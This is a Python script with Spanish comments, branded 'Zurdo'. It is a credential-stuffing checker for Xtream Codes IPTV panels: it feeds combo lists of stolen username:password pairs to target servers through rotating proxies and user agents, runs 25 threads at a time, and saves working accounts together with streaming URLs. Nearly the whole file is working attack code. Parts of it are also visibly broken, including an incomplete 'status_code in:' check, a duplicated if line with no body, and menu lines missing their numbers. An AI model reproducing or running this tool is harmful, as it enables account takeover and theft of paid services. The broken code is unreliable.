import os
import sys
import time
import random
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from colorama import init, Fore, Style

# Inicializar colorama de manera global
init(autoreset=True)

# SECCIÓN DE COLORES VIP: Verde Neón Fosforescente Extendido y Cian Eléctrico
NEON_VERDE = '\033[38;5;118m'
CIAN_ELEC = '\033[38;5;81m'
AMARILLO_BR = '\033[93m'
ROJO_BR = '\033[91m'
BLANCO_BR = '\033[97m'
MAGENTA_BR = '\033[95m'
RESET = '\033[0m'

# BANNER HACKER: Estructura milimétricamente centrada y alineada 🥷🏻🇪🇨
BANNER_RECUADRO = f"""
{NEON_VERDE}╔══════════════════════════════════════════════════════════╗
║                                                          ║
║             {CIAN_ELEC}{Style.BRIGHT}🥷🏻  DESARROLLADOR ZURDO 🇪🇨 🥷🏻              {NEON_VERDE}║
║                                                          ║
║    {AMARILLO_BR}"Todos podemos lograrlo con dedicacion y constancia"  {NEON_VERDE}║
║                                                          ║
╚══════════════════════════════════════════════════════════╝"""

# Variables globales de control de red simplificadas
PROXIES_GLOBALES = []
USAR_PROXIES = False

# Agentes de usuario limpios para evitar bloqueos
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Android; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0"
]

def arranque():
    """Función de arranque original limpia con tus insignias oficiales 🥷🏻🇪🇨 y tonos neón"""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER_RECUADRO)
    for txt in ["🛸 Inicializando directorios Android...", "🧬 Desplegando hilos masivos...", "🛡️ Ajustando módulos de red...", "💎 Módulos cargados correctamente.\n"]:
        print(CIAN_ELEC + txt)
        time.sleep(0.01)

def emitir_pitido_hit():
    """Alerta física y acústica universal ultra fluida"""
    try:
        import androidhelper
        droid = androidhelper.Android()
        droid.vibrate(250)
    except:
        pass
    sys.stdout.write('\a')
    sys.stdout.flush()

def preparar_directorios_universales():
    """Crea carpetas para combos, proxies y hits adaptándose a Android o PC local"""
    p_dir = "/storage/emulated/0/proxy"
    c_dir = "/storage/emulated/0/combo"
    h_dir = "/storage/emulated/0/hits"
    
    if not os.path.exists("/storage/emulated/0") or not os.access("/storage/emulated/0", os.W_OK):
        p_dir = "./proxy"
        c_dir = "./combo"
        h_dir = "./hits"
        
    for path in [p_dir, c_dir, h_dir]:
        if not os.path.exists(path):
            try:
                os.makedirs(path)
            except:
                pass
    return p_dir, c_dir, h_dir

def verificar_un_proxy(p_dict):
    """Prueba la conectividad real de un proxy con un agente aleatorio"""
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    try:
        r = requests.get("https://ipify.org", headers=headers, proxies=p_dict, timeout=2.5)
        if r.status_code == 200:
            return True, p_dict
    except:
        pass
    return False, p_dict

def menu_asignacion_red_proxy(p_dir):
    """Menú local ordenado con enumeración limpia en corchetes fosforescentes"""
    global PROXIES_GLOBALES, USAR_PROXIES
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER_RECUADRO)
    
    print(f"{AMARILLO_BR}🛡️  SISTEMA DE ASIGNACIÓN DE RED IP:")
    print(f" {NEON_VERDE}{RESET} PROXIES DEL SISTEMA (Archivos Locales .txt en carpeta proxy)")
    print(f" {NEON_VERDE}{RESET} COLOCAR PROXIES MANUALMENTE (Pegar lista o IP:Port en consola)")
    print(f" {NEON_VERDE}{RESET} USAR INTERNET LOCAL DIRECTO (Sin Proxies)")
    print(MAGENTA_BR + "══════════════════════════════════════════════")
    
    opc_principal = input(f"{AMARILLO_BR}👉 Selecciona tu modo de red (1-3): {CIAN_ELEC}").strip()
    
    if opc_principal == '3':
        USAR_PROXIES = False
        PROXIES_GLOBALES = []
        print(f"\n{AMARILLO_BR}⚠️  Sistema IP: Trabajando directo con tu conexión de internet local.")
        time.sleep(1.0)
        return

    lineas_en_crudo = []
    
    if opc_principal == '1':
        try:
            archivos_proxy = [f for f in os.listdir(p_dir) if f.endswith('.txt')]
        except:
            archivos_proxy = []
            
        if not archivos_proxy:
            print(f"{ROJO_BR}❌ No se encontraron archivos de proxies (.txt) en la ruta: {p_dir}")
            input(f"{AMARILLO_BR}Presiona ENTER para reintentar...")
            return

        print(f"\n{AMARILLO_BR}📂 ARCHIVOS DETECTADOS EN EL SISTEMA:")
        for idx, archivo in enumerate(archivos_proxy, 1):
            print(f" {NEON_VERDE}[{idx:02d}]{RESET} {archivo}")
        print(MAGENTA_BR + "══════════════════════════════════════════════")
        
        try:
            sel = int(input(f"{AMARILLO_BR}👉 Selecciona tu archivo de proxies: {CIAN_ELEC}")) - 1
            if sel < 0 or sel >= len(archivos_proxy):
                raise ValueError
            archivo_final = os.path.join(p_dir, archivos_proxy[sel])
            with open(archivo_final, "r", encoding="utf-8", errors="ignore") as f:
                lineas_en_crudo = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        except:
            print(f"{ROJO_BR}❌ Selección inválida.")
            time.sleep(1.0)
            return

    elif opc_principal == '2':
        print(f"\n{AMARILLO_BR}📥 Pega tus proxies abajo (Formato IP:Puerto).")
        print(f"{BLANCO_BR}Presiona ENTER dos veces o escribe 'FIN' cuando termines:")
        while True:
            entrada = input(f"{CIAN_ELEC}> {BLANCO_BR}").strip()
            if entrada.lower() == 'fin' or entrada == '':
                break
            lineas_en_crudo.append(entrada)
    else:
        print(f"{ROJO_BR}❌ Opción inválida.")
        time.sleep(1.0)
        return

    if not lineas_en_crudo:
        print(f"\n{ROJO_BR}❌ No se obtuvieron registros de proxies. Trabajando sin protección.")
        USAR_PROXIES = False
        PROXIES_GLOBALES = []
        time.sleep(1.5)
        return

    print(f"\n{AMARILLO_BR}🌐 SELECCIONA EL PROTOCOLO REQUERIDO:")
    print(f" {NEON_VERDE}{RESET} HTTP / HTTPS")
    print(f" {NEON_VERDE}{RESET} SOCKS4")
    print(f" {NEON_VERDE}{RESET} SOCKS5")
    
    opc_proto = input(f"{AMARILLO_BR}👉 Elige una opción (1-3): {CIAN_ELEC}").strip()
    prefix = "http://" if opc_proto == '1' else ("socks4://" if opc_proto == '2' else "socks5h://")

    proxies_candidatos = []
    for ip_raw in lineas_en_crudo:
        ip_limpia = ip_raw.replace("http://", "").replace("https://", "").replace("socks5://", "").replace("socks4://", "")
        proxies_candidatos.append({"http": f"{prefix}{ip_limpia}", "https": f"{prefix}{ip_limpia}"})

    print(f"\n{AMARILLO_BR}🔎 Verificando estabilidad de {len(proxies_candidatos)} proxies en paralelo...")
    proxies_vivos = []

    with ThreadPoolExecutor(max_workers=40) as checker_executor:
        futs = {checker_executor.submit(verificar_un_proxy, p): p for p in proxies_candidatos[:300]}
        for val in as_completed(futs):
            sirve, p_dict = val.result()
            if sirve:
                proxies_vivos.append(p_dict)
                sys.stdout.write(f"\r{NEON_VERDE}[VIVOS]: {len(proxies_vivos)} proxies estables detectados.")
                sys.stdout.flush()
    
    if proxies_vivos:
        PROXIES_GLOBALES = proxies_vivos
        USAR_PROXIES = True
        print(f"\n\n{NEON_VERDE}✅ ¡Verificación Completa! {len(PROXIES_GLOBALES)} proxies listos para usar.")
        time.sleep(1.5)
    else:
        print(f"\n\n{ROJO_BR}❌ Todos los proxies fallaron el test de velocidad. Reintentando...")
        USAR_PROXIES = False
        PROXIES_GLOBALES = []
        time.sleep(2.0)

def realizar_consulta_panel(url_panel, usuario, contrasena, h_dir):
    """Módulo validador con tu clonación v6.1 estricta, tus insignias 🥷🏻🇪🇨 fijas y filtrado anti-error"""
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    proxy = random.choice(PROXIES_GLOBALES) if USAR_PROXIES and PROXIES_GLOBALES else None
    
    url_base = url_panel.rstrip('/')
    target_url = f"{url_base}/player_api.php?username={usuario}&password={contrasena}"
    
    try:
        r = requests.get(target_url, headers=headers, proxies=proxy, timeout=3.0)
        if r.status_code == 200:
            try:
                data = r.json()
                auth = data.get("user_info", {}).get("auth", 0)
                
                if str(auth).strip() == "1" or auth is True:
                    u_info = data.get("user_info", {})
                    status = u_info.get("status", "Active")
                    
                    if status.lower() not in ["active", "enabled", "activo"]:
                        return "BAD", None, None
                        
                    expira_raw = u_info.get("exp_date")
                    max_connections = u_info.get("max_connections", "0")
                    active_cons = u_info.get("active_cons", "0")
                    
                    tipo_vencimiento = "ilimitado"
                    texto_clasificacion = "ILIMITADO (💎)"
                    
                    if expira_raw and str(expira_raw).strip().lower() != "null":
                        try:
                            timestamp_exp = int(expira_raw)
                            expira = datetime.fromtimestamp(timestamp_exp).strftime('%Y-%m-%d')
                            
                            segundos_restantes = timestamp_exp - int(time.time())
                            if segundos_restantes <= 0:
                                return "BAD", None, None  
                            elif segundos_restantes <= 2592000:
                                tipo_vencimiento = "pronto"
                                texto_clasificacion = "VENCE PRONTO (⚠️)"
                            else:
                                tipo_vencimiento = "mucho"
                                texto_clasificacion = "VENCE LEJOS (🟢)"
                        except:
                            expira = "Ilimitado"
                            tipo_vencimiento = "ilimitado"
                            texto_clasificacion = "ILIMITADO (💎)"
                    else:
                        expira = "Ilimitado"
                        tipo_vencimiento = "ilimitado"
                        texto_clasificacion = "ILIMITADO (💎)"

                    # TU DISEÑO v6.1 CLONADO AL 100% MANTENIENDO EL ALINEAMIENTO DE TUS EMOJIS 🥷🏻🇪🇨
                    resultado_formateado = (
                        f"=========================================================\n"
                        f"🥷🏻  RESULTADO ENCONTRADO POR ZURDO v6.1 🇪🇨  🫵\n"
                        f"=========================================================\n"
                        f"👤 SERVIDOR      → {url_base}\n"
                        f"👤 USUARIO       → {usuario}\n"
                        f"👤 CONTRASEÑA    → {contrasena}\n"
                        f"📅 EXPIRACIÓN    → {expira}\n"
                        f"🌲 CONEXIONES    → {active_cons} / {max_connections}\n"
                        f"🌲 ESTADO        → {status}\n"
                        f"🌐 ZONA HORARIA  → America/Guayaquil\n"
                        f"🛡️  VIGENCIA      → {texto_clasificacion}\n"
                        f"---------------------------------------------------------\n"
                        f"📊 INFORMACIÓN DE CONTENIDOS →\n"
                        f"📺 CANALES EN VIVO      → Disponible\n"
                        f"🎬 PELÍCULAS Y VOD      → Disponible\n"
                        f"🍿 SERIES DE TELEVISIÓN → Disponible\n"
                        f"---------------------------------------------------------\n"
                        f"🔗 FORMATO XTREAM CODES →\n"
                        f"{url_base}|{usuario}|{contrasena}\n"
                        f"📄 URL M3U PLUS COMPLETA →\n"
                        f"{url_base}/get.php?username={usuario}&password={contrasena}&type=m3u_plus\n"
                        f"=========================================================\n"
                        f"🥷🏻 PROTEGIDO Y PROGRAMADO POR ZURDO 🇪🇨 🥷🏻\n"
                        f"=========================================================\n\n\n"
                    )
                    
                    ruta_hit = os.path.join(h_dir, "hits_validos.txt")
                    with open(ruta_hit, "a", encoding="utf-8") as f:
                        f.write(resultado_formateado)
                        
                    emitir_pitido_hit()
                    return "HIT", tipo_vencimiento, resultado_formateado
                else:
                    return "BAD", None, None
            except:
                return "BAD", None, None
        else:
            return "ERROR", None, None
    except:
        return "TIMEOUT", None, None

def bucle_procesador_masivo(c_dir, h_dir):
    """Módulo profesional clonado con tu validador de servidores en fósforo e indexación original"""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER_RECUADRO)
    
    try:
        archivos_combo = [f for f in os.listdir(c_dir) if f.endswith('.txt')]
    except:
        archivos_combo = []

    if not archivos_combo:
        print(f"{ROJO_BR}❌ No se encontraron combos (.txt) en la ruta: {c_dir}")
        print(f"{AMARILLO_BR}💡 Por favor, coloca tu archivo de texto con las cuentas en esa ruta.")
        time.sleep(3.0)
        return

    # TUS LISTAS ENUMERADAS EN FORMATO NEÓN FOSFORESCENTE
    for idx, combo_f in enumerate(archivos_combo, 1):
        print(f" {NEON_VERDE}[{idx:02d}]{BLANCO_BR} {combo_f}")
    print(MAGENTA_BR + "══════════════════════════════════════════════")
    
    try:
        sel_c = int(input(f"{AMARILLO_BR}👉 Selecciona tu combo: {CIAN_ELEC}")) - 1
        archivo_combo_final = os.path.join(c_dir, archivos_combo[sel_c])
    except:
        print(f"{ROJO_BR}❌ Selección inválida.")
        time.sleep(1.5)
        return

    # ENTRADA DE SERVIDORES CON EL BYPASS DE COMPROBACIÓN CORREGIDO (200, 401, 403)
    print(f"\n{CIAN_ELEC}🌐 Ingresa los servidores Xtream objetivos (Escribe 'OK' para terminar):")
    lista_paneles = []
    for i in range(10):
        url_in = input(f"{NEON_VERDE} Servidor #{i+1}:{CIAN_ELEC}").strip()
        
        if url_in.lower() == 'ok':
            if len(lista_paneles) == 0:
                print(f"{ROJO_BR}❌ Debes agregar al menos 1 servidor antes de continuar.")
                continue
            break
            
        if url_in:
            if not url_in.startswith("http"):
                url_in = "http://" + url_in
            
            print(f"   {BLANCO_BR}⏳ Verificando conectividad con el panel...")
            try:
                # BYPASS DE CORTAFUEGOS: Comprobación con parámetros ficticios
                test_url = f"{url_in.rstrip('/')}/player_api.php?username=test&password=test"
                test_r = requests.get(test_url, timeout=3.0)
                
                if test_r.status_code in:
                    print(f"   {NEON_VERDE}✅ Servidor Activo y Respondiendo.")
                    lista_paneles.append(url_in)
                else:
                    print(f"   {ROJO_BR}❌ Error: El servidor respondió con código alternativo ({test_r.status_code}).")
            except:
                print(f"   {ROJO_BR}❌ Error: Servidor Caído o Parámetros Incorrectos.")

    if not lista_paneles:
        print(f"{ROJO_BR}❌ Lista de objetivos vacía. Abortando.")
        time.sleep(2.0)
        return

    cuentas_limpias = []
    vistas = set() 
    try:
        with open(archivo_combo_final, "r", encoding="utf-8", errors="ignore") as f:
            for linea in f:
                l_s = linea.strip()
                if l_s and ":" in l_s and not l_s.startswith("#"):
                    if l_s not in vistas:
                        vistas.add(l_s)
                        parts = l_s.split(":")
                        if len(parts) >= 2:
                            cuentas_limpias.append((parts[0].strip(), parts[1].strip()))
    except:
        pass

    if not cuentas_limpias:
        print(f"{ROJO_BR}❌ El archivo no contiene credenciales válidas.")
        time.sleep(2.5)
        return

    limite_bots = 25
    print(f"\n{NEON_VERDE}🔥 Inciando escaneo con {limite_bots} bots activos en paralelo...")
    print(f"{BLANCO_BR}Monitoreando progreso en tiempo real. Presiona CTRL + C para salir al menú.\n")
    time.sleep(1.0)

    totales = len(cuentas_limpias) * len(lista_paneles)
    procesados = 0
    
    cuenta_ilimitados = 0   
    cuenta_mucho_tiempo = 0  
    cuenta_pronto_vence = 0  

    tiempo_inicio = time.time()

    with ThreadPoolExecutor(max_workers=limite_bots) as executor:
        futuros = []
        for u, p in cuentas_limpias:
            for server in lista_paneles:
                futuros.append(executor.submit(realizar_consulta_panel, server, u, p, h_dir))

        try:
            for fut in as_completed(futuros):
                res_tipo, venc_tipo, msg = fut.result()
                procesados += 1
                
                if res_tipo == "HIT":
                    if venc_tipo == "ilimitado":
                        cuenta_ilimitados += 1
                    elif venc_tipo == "mucho":
                        cuenta_mucho_tiempo += 1
                    elif venc_tipo == "pronto":
                        cuenta_pronto_vence += 1
                        
                    print(f"\n{NEON_VERDE}[HIT DETECTADO] 🥷🏻🇪🇨\n{msg.strip()}\n")
                
                if procesados % 10 == 0 or procesados == totales:

                # REFRESCADOR ANTI-TILDE: Actualiza la barra inferior solo cada 10 cuentas para fluidez absoluta
                if procesados % 10 == 0 or procesados == totales:
                    tiempo_transcurrido = time.time() - tiempo_inicio
                    cpm = int((procesados / tiempo_transcurrido) * 60) if tiempo_transcurrido > 0 else 0
                    
                    sys.stdout.write(
                        f"\r{CIAN_ELEC}[PROGRESO]: {procesados}/{totales} | "
                        f"{AMARILLO_BR}⚡ CPM: {cpm} | "
                        f"{CIAN_ELEC}💎: {cuenta_ilimitados} | "
                        f"{NEON_VERDE}🟢: {cuenta_mucho_tiempo} | "
                        f"{AMARILLO_BR}⚠️: {cuenta_pronto_vence} | "
                        f"{BLANCO_BR}[PROXIES]: {len(PROXIES_GLOBALES) if USAR_PROXIES else 'OFF'}"
                    )
                    sys.stdout.flush()
        except KeyboardInterrupt:
            print(f"\n\n{AMARILLO_BR}🛑 Proceso pausado de manera controlada.")

    print(f"\n\n{NEON_VERDE}🏁 [FIN DEL PROCESO] Verificación terminada correctamente.")
    input(f"\n{AMARILLO_BR}Presiona ENTER para regresar al panel principal...")

def iniciar_flujo_completo():
    p_dir, c_dir, h_dir = preparar_directorios_universales()
    while True:
        arranque()
        menu_asignacion_red_proxy(p_dir)
        bucle_procesador_masivo(c_dir, h_dir)

if __name__ == "__main__":
    try:
        iniciar_flujo_completo()
    except KeyboardInterrupt:
        print(f"\n\n{ROJO_BR}❌ Script cerrado por el usuario. ¡Hasta la próxima, Zurdo!")
        sys.exit(0)

